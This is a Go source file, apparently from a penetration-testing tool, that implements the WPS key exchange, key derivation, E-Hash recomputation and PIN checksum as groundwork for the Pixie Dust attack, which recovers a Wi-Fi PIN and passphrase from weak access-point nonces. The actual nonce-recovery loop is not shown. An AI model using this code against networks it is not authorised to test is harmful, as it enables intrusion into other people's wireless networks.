// Package wps implements the WPS registration protocol far enough to run Pixie Dust.
//
// # What Pixie Dust is
//
// WPS PIN registration protects the PIN with two commitments the access point sends in M3:
//
//	E-Hash1 = HMAC-AuthKey(E-S1 || PSK1 || PKE || PKR)
//	E-Hash2 = HMAC-AuthKey(E-S2 || PSK2 || PKE || PKR)
//
// PSK1 and PSK2 are derived from the two halves of the PIN. E-S1 and E-S2 are secret nonces
// whose entire job is to stop those hashes being brute-forced: without them there are only
// 10^4 candidates for the first half and 10^3 for the second, which is nothing.
//
// A great many access points generate E-S1 and E-S2 badly. Some set both to zero. Some reuse
// the enrollee nonce that was already sent in the clear in M1. Some seed a linear congruential
// generator with the time and produce all three from consecutive draws. In every one of those
// cases the nonces are recoverable, and once they are, the PIN falls in under a second on a
// laptop - and the PIN yields the WPA passphrase directly.
//
// # Why this one and not online PIN brute force
//
// Online PIN recovery needs thousands of round trips to the access point over hours, and it
// only works while it can keep talking to it. Pixie Dust needs **one exchange**: associate,
// four messages, disconnect. Everything after that is arithmetic on a laptop, which matters on
// an engagement where there may well be no route off the box to anything.
//
// It is also enormously less disruptive at a client site. Thousands of failed registrations
// against a production access point locks WPS, fills the client's logs, and on some models
// destabilises the radio. This is one association.
//
// # What WARP does and does not do
//
// The exchange stops at M3. WARP sends M1 through M2 and reads M3, then disconnects - it never
// sends M4, never completes registration, and never joins the network. The recovery is
// arithmetic on what M1 and M3 already contained.
package wps

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"math/big"
)

// dhPrime is the 1536-bit MODP group (RFC 3526 group 5), which WPS mandates.
var dhPrime, _ = new(big.Int).SetString(
	"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"+
		"29024E088A67CC74020BBEA63B139B22514A08798E3404DD"+
		"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"+
		"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"+
		"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"+
		"C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"+
		"83655D23DCA3AD961C62F356208552BB9ED529077096966D"+
		"670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF", 16)

var dhGenerator = big.NewInt(2)

// dhKeyLen is the fixed length of a WPS public key: 192 octets, zero-padded on the left.
// Trimming a leading zero byte - which happens on roughly one exchange in 256 - changes every
// derived key and produces a silent failure that looks like a broken access point.
const dhKeyLen = 192

// NonceLen is the length of the enrollee and registrar nonces.
const NonceLen = 16

// Keys are the session keys derived from the Diffie-Hellman exchange.
type Keys struct {
	// AuthKey signs the message authenticators and is what the hashes are keyed with.
	AuthKey []byte
	// KeyWrapKey encrypts the settings blobs. Unused here - the exchange stops before any
	// settings are sent - but derived because the KDF produces all three at once.
	KeyWrapKey []byte
	// EMSK is the extended master session key.
	EMSK []byte
}

// DeriveKeys performs the WPS key derivation.
//
// dhShared is g^(ab) mod p as a big-endian 192-octet value; enrolleeMAC is the access point's
// own address as it appeared in M1, not the BSSID we aimed at - on a multi-BSSID radio those
// differ, and using the wrong one silently produces keys that verify against nothing.
func DeriveKeys(dhShared, n1, enrolleeMAC, n2 []byte) (Keys, error) {
	if len(n1) != NonceLen || len(n2) != NonceLen {
		return Keys{}, fmt.Errorf("wps: nonces must be %d octets, got %d and %d",
			NonceLen, len(n1), len(n2))
	}
	if len(enrolleeMAC) != 6 {
		return Keys{}, fmt.Errorf("wps: enrollee MAC must be 6 octets, got %d", len(enrolleeMAC))
	}

	// DHKey = SHA-256(shared secret).
	sum := sha256.Sum256(dhShared)

	// KDK = HMAC-DHKey(N1 || EnrolleeMAC || N2).
	mac := hmac.New(sha256.New, sum[:])
	mac.Write(n1)
	mac.Write(enrolleeMAC)
	mac.Write(n2)
	kdk := mac.Sum(nil)

	// 640 bits: AuthKey (256) + KeyWrapKey (128) + EMSK (256).
	out := kdf(kdk, "Wi-Fi Easy and Secure Key Derivation", 640)
	return Keys{
		AuthKey:    out[0:32],
		KeyWrapKey: out[32:48],
		EMSK:       out[48:80],
	}, nil
}

// kdf is the WPS key derivation function: counter-mode HMAC-SHA256.
func kdf(key []byte, personalization string, bits int) []byte {
	total := (bits + 7) / 8
	out := make([]byte, 0, total+sha256.Size)

	for i := uint32(1); len(out) < total; i++ {
		mac := hmac.New(sha256.New, key)
		_ = binary.Write(mac, binary.BigEndian, i)
		mac.Write([]byte(personalization))
		_ = binary.Write(mac, binary.BigEndian, uint32(bits))
		out = mac.Sum(out)
	}
	return out[:total]
}

// DHKeypair is one side's Diffie-Hellman contribution.
type DHKeypair struct {
	Private *big.Int
	// Public is the 192-octet big-endian public value, ready to put on the wire.
	Public []byte
}

// NewDHKeypair generates a registrar keypair.
func NewDHKeypair() (*DHKeypair, error) {
	priv, err := rand.Int(rand.Reader, dhPrime)
	if err != nil {
		return nil, fmt.Errorf("wps: generate Diffie-Hellman private key: %w", err)
	}
	pub := new(big.Int).Exp(dhGenerator, priv, dhPrime)
	return &DHKeypair{Private: priv, Public: padTo(pub.Bytes(), dhKeyLen)}, nil
}

// Shared computes the shared secret against a peer's public value.
func (k *DHKeypair) Shared(peerPublic []byte) ([]byte, error) {
	if len(peerPublic) != dhKeyLen {
		return nil, fmt.Errorf("wps: peer public key is %d octets, expected %d",
			len(peerPublic), dhKeyLen)
	}
	peer := new(big.Int).SetBytes(peerPublic)
	// A peer value of 0, 1 or p-1 yields a shared secret with no entropy. Access points do not
	// send those; something pretending to be one might.
	if peer.Sign() <= 0 || peer.Cmp(big.NewInt(1)) == 0 ||
		peer.Cmp(new(big.Int).Sub(dhPrime, big.NewInt(1))) >= 0 {
		return nil, errors.New("wps: peer public key is degenerate")
	}
	shared := new(big.Int).Exp(peer, k.Private, dhPrime)
	return padTo(shared.Bytes(), dhKeyLen), nil
}

// padTo left-pads b with zeros to n octets. See dhKeyLen for why this is not optional.
func padTo(b []byte, n int) []byte {
	if len(b) >= n {
		return b[len(b)-n:]
	}
	out := make([]byte, n)
	copy(out[n-len(b):], b)
	return out
}

// hashHalf recomputes one of the enrollee's commitments.
//
//	E-Hash_n = HMAC-AuthKey(E-S_n || PSK_n || PKE || PKR)
func hashHalf(authKey, es, psk, pke, pkr []byte) []byte {
	mac := hmac.New(sha256.New, authKey)
	mac.Write(es)
	mac.Write(psk)
	mac.Write(pke)
	mac.Write(pkr)
	return mac.Sum(nil)
}

// pskHalf derives PSK1 or PSK2 from one half of the PIN.
//
//	PSK_n = first 128 bits of HMAC-AuthKey(PIN half, as ASCII digits)
func pskHalf(authKey []byte, digits string) []byte {
	mac := hmac.New(sha256.New, authKey)
	mac.Write([]byte(digits))
	return mac.Sum(nil)[:16]
}

// PINChecksum returns the check digit for a 7-digit PIN body, per the WPS specification.
//
// Alternating weights of 3 and 1 from the least significant digit, which is why it is written
// as a loop rather than an unrolled expression: getting one weight the wrong way round yields
// a checksum that is right for one PIN in ten.
func PINChecksum(body int) int {
	accum := 0
	for body > 0 {
		accum += 3 * (body % 10)
		body /= 10
		accum += body % 10
		body /= 10
	}
	return (10 - accum%10) % 10
}

// ValidPIN reports whether an 8-digit PIN's check digit is correct.
func ValidPIN(pin string) bool {
	if len(pin) != 8 {
		return false
	}
	body := 0
	for _, r := range pin[:7] {
		if r < '0' || r > '9' {
			return false
		}
		body = body*10 + int(r-'0')
	}
	if pin[7] < '0' || pin[7] > '9' {
		return false
	}
	return PINChecksum(body) == int(pin[7]-'0')
}
